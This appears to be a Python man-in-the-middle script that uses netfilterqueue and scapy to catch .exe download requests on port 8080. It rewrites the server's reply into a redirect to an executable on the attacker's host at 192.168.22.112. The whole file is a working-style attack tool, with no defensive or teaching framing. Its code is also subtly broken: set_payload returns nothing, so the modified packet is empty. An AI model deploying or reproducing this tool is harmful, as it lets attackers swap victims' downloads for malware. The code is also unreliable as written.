import netfilterqueue
import scapy.all as scapy
ack_list = []

def set_payload(packet):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.22.112/test.exe\n\n"
                
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 8080:
            if ".exe" in str(scapy_packet[scapy.Raw].load) and "192.168.22.112" not in str(scapy_packet[scapy.Raw].load):
                print("EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("EXE Response")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                
                modified_packet =  set_payload(scapy_packet)

                packet.set_payload(bytes(modified_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()

#0 is the queue number mentionned in iptables command
queue.bind(0, process_packet)

queue.run()